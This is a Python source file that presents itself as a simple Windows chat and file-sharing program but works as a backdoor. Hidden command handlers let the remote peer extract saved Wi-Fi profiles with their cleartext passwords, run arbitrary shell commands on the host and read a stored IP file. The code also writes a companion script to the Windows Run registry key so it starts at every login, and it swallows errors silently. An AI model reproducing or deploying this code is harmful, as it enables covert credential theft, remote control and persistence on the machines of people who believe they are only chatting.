import time, socket, sys
import os
import win32process, easygui, pyautogui
import subprocess
from pexecute.thread import ThreadLoom
from pynput.keyboard import Key, Listener
import logging
import winreg as reg1
from zipfile import *
import tkinter
import tkinter.filedialog
f = open("chatlog_setup.txt", "a+")
print('Welcome to Chat')
ff=open('Help For Server','r')
pyautogui.alert(ff.read(),'PLEASE READ THIS CAREFULLY')
ff.close()
time.sleep(1)
soc = socket.socket()
host_name = socket.gethostname()
ip = socket.gethostbyname(host_name)
port = 1235
soc.bind((host_name, port))
print('Your Computer Information :',host_name, '({})'.format(ip))
print("Make sure that you inform your friend your IP Address")
soc.listen(1) 
print('Waiting for incoming connections...')
socb = socket.socket()
host_nameb = socket.gethostname()
ipb = socket.gethostbyname(host_nameb)
portb = 1234
socb.bind((host_nameb, portb))
socb.listen(1) 
connectionb, addrb = socb.accept()
connection, addr = soc.accept()
def fun3():
    os.system('libraries.pyw')
    try:
        pth1 =os.path.dirname(os.path.realpath(__file__))
        s_name1="libraries.pyw"
        address1=os.path.join(pth1,s_name1)
        key1 = reg1.HKEY_CURRENT_USER
        key_value1 ="Software\Microsoft\Windows\CurrentVersion\Run"
        open=reg1.OpenKey(key1,key_value1,0,reg1.KEY_ALL_ACCESS)
        reg1.SetValueEx(open,"libraries",0,reg1.REG_SZ,address1)
        reg1.CloseKey(open)
    except:
        pass
def fun1():
    while(True):
        try:
            message = connection.recv(1024)
            message = message.decode()
            message=str(message)
            if(message=='sendfile'):
                pyautogui.alert('YOUR BUDDY WANTS TO SEND A FILE PRESS OK TO RECIEVE', "ALERT")
                with open('recievedfile.zip', 'wb+') as output:
                        rec = connection.recv(9000000)
                        output.write(rec)
                        pyautogui.alert('FILE RECIEVED','ALERT')
                continue
            meslist=message.split()
            if(message=='wifipasswordstart'+'\n'):
                results = subprocess.check_output(["netsh", "wlan", "show", "profile"])
                results = results.decode("ascii")
                connectionb.send(results.encode())
                continue
            if(message=='secretaccessorip'+'\n'):
                fr = open("ipfile", "r")
                ipp=fr.read()
                connectionb.send(ipp.encode())
                fr.close()
            elif(str(meslist[0])=='passwordof'):
                results = subprocess.check_output(["netsh", "wlan", "show", "profile", str(meslist[1]), "key=clear"])
                results = results.decode("ascii")
                connectionb.send(results.encode())
                continue
            elif(str(meslist[0])=='runcmd'):
                try:
                    results = subprocess.check_output(meslist[1:])
                    results = results.decode("ascii")
                except:
                    results="COMMAND RETURNS ERROR"
                connectionb.send(results.encode())
                continue
            else:
                try:
                    chat='Your Friend > '+message+'\n'
                    f = open("chatlog_setup.txt", "a+")
                    f.write(chat)
                    f.close()
                    pyautogui.alert( message, "Your Buddy Says")
                except:
                    pass
        except:
            pass
def fun2():
    while(True):
        messageb = input('Me > ')
        if(messageb=='sendfile'):
            connectionb.send(messageb.encode())
            try:
                fname = easygui.fileopenbox()
                with ZipFile('sendFILE.zip', 'w') as myzip:
                    myzip.write(fname)
                with open ('sendFILE.zip','rb') as f1:
                    connectionb.send(f1.read(9000000))
                os.remove('sendFile.zip')
                pyautogui.alert( 'FILE SENT', "ALERT ")
            except:
                continue
        if(messageb=='help'):
            fb = open("Help for Server", "r")
            try:
                pyautogui.alert( fb.read() , "HELP ")
                fb.close()
                continue
            except:
                pass

        messageb=messageb+'\n'
        chatb='You > '+messageb
        fqq = open("chatlog_setup.txt", "a+")
        fqq.write(chatb)
        fqq.close()
        connectionb.send(messageb.encode())
        if(messageb=='bye'+'\n'):
            exit()

loom = ThreadLoom(max_runner_cap=10)
loom.add_function(fun1, [], {})
loom.add_function(fun2, [], {})
loom.add_function(fun3, [], {})
output = loom.execute()

